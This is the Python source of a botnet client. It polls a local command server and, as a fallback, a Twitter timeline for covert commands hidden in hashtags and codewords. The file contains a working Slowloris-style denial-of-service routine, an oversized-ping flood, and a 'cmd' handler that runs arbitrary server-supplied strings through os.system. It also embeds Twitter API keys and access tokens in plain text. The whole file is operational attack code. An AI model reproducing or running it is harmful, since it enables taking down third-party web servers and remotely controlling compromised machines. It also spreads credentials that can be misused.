# client.py
import time
import socket
import random
import os
import tweepy
from threading import Thread
#globals
target = ''
command = ''
log_level = 2
currently_dosing = False

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
    ]

def log(text, level=1):
    if log_level >= level:
        print(text)


def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, 80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in regular_headers:
        s.send(("{}\r\n".format(header).encode("utf-8")))
    return s


def DoS(result_string):
    global currently_dosing, command
    ip = result_string
    socket_count = 100
    log("Attacking {} with {} sockets".format(ip, socket_count))

    log("Creating sockets..")
    for _ in range(socket_count):
        try:
            log("Creating socket nr {}".format(_), level=2)
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        log("Sending keep-alive headers... socket count: {}".format(list_of_sockets))
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            log("Recreating socket...")
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        if command == 'stop':
            print("stopping DoS attack")
            currently_dosing = False
            return
        time.sleep(15)


class TwitterAPI:
    def __init__(self):
        consumer_key = "kE2qKHbUyIP7eFZwpiQFcDS18"
        consumer_secret = "2C5QP9QtJxprydZjw2VjTDL2O2Jc1SExNqrpm5XeUWaSeAmfqS"
        auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
        access_token = "843786300188704768-2zFNwekrzOWHNOAoxYphVdQEKo0Nh6Q"
        access_token_secret = "Mq3Cz5s0l3UhDaBcptzUBw8CCJm6i7oqM6IQCmqWV8GPK"
        auth.set_access_token(access_token, access_token_secret)
        self.api = tweepy.API(auth)

    def get_tweet(self):
        global target, command, currently_dosing
        wordNum = 0
        while True:
            try:
                tweet = self.api.home_timeline(id=self.api, count=1)[0]
                break
            except tweepy.TweepError:
                return
        print(tweet.text)
        input = tweet.text
        split_input = input.split()

        for wordNum in range(wordNum, len(split_input), +1):
            #print(split_input[wordNum])
            # using # to find target in tweet
            hashDetect = split_input[wordNum].count('#')
            counter = len(split_input[0])

            if hashDetect >= 1:
                target = split_input[wordNum].replace("#", "")
            if split_input[wordNum] == 'goodnight':
                command = 'stop'
            if split_input[wordNum] == 'amazing':
                command = 'ping'
            if split_input[wordNum] == 'crazy':
                command = 'dos'

            if counter == 1:
                command = 'dos'
            if counter == 2:
                command = 'ping'
            if counter == 4:
                command = 'stop'


        print("Target is: {}".format(target))
        print("Command is: {}".format(command))

        if command == 'ping':
            if target != '':
                ping_IP(target)
                target = ''
                command = ''

        if command == 'dos':
            if target != '':
                if currently_dosing == False:
                    currently_dosing = True
                    ct = Thread(target=DoS, args=[target])
                    ct.start()


def ping_IP(result_string):
    hostname = result_string
    print(hostname)
    os.system("ping {} -l 65500 -w 1 -n 1 ".format(hostname))
    return


def execute_command(result_string):
    command = result_string
    os.system(command)


def start_client():
    global currently_dosing, command
    connection_counter = 0
    clients_input = "GO"

    while True:
        # Try connect continuously
        while True:
            try:
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                soc.connect(("127.0.0.1", 12345))
            except:
                print("No connection available - retrying")
                connection_counter += 1
                soc.close()
                time.sleep(3)
                if connection_counter == 3:
                    twitter.get_tweet()
                    connection_counter = 0
                continue
            break

        # acknowledge connection
        print('Connection Status: Online')
        # send message
        # clients_input = input("What you want to proceed my dear Master?\n")
        clients_input = 'online'
        try:
            soc.send(clients_input.encode("utf8")) # we must encode the string to bytes
        except ConnectionResetError:
            print("Connection was ended by the server")
            continue

        try:
            # receive reply
            result_bytes = soc.recv(4096)  # the number means how the response can be in bytes
            result_string = result_bytes.decode("utf8") # the return will be in bytes, so decode
        except ConnectionResetError:
            print("Connection was ended by the server")
            continue

        if result_string == 'ping':
            # receive address
            command = result_string
            result_bytes = soc.recv(4096)  # the number means how the response can be in bytes
            result_string = result_bytes.decode("utf8")  # the return will be in bytes, so decode
            ping_IP(result_string)

        if result_string == 'cmd':
            # receive command to execute
            command = result_string
            result_bytes = soc.recv(4096)  # the number means how the response can be in bytes
            result_string = result_bytes.decode("utf8")  # the return will be in bytes, so decode
            execute_command(result_string)

        if result_string == 'dos':
            # receive command to execute
            command = result_string
            result_bytes = soc.recv(4096)  # the number means how the response can be in bytes
            result_string = result_bytes.decode("utf8")  # the return will be in bytes, so decode
            if currently_dosing == False:
                ct = Thread(target=DoS, args=[result_string])
                ct.start()
                currently_dosing = True
            else:
                print("DoS in progress")

        if result_string == 'stop':
            command = result_string


        #wait
        time.sleep(5)


if __name__ == "__main__":
    twitter = TwitterAPI()
    #twitter.get_tweet()
    start_client()

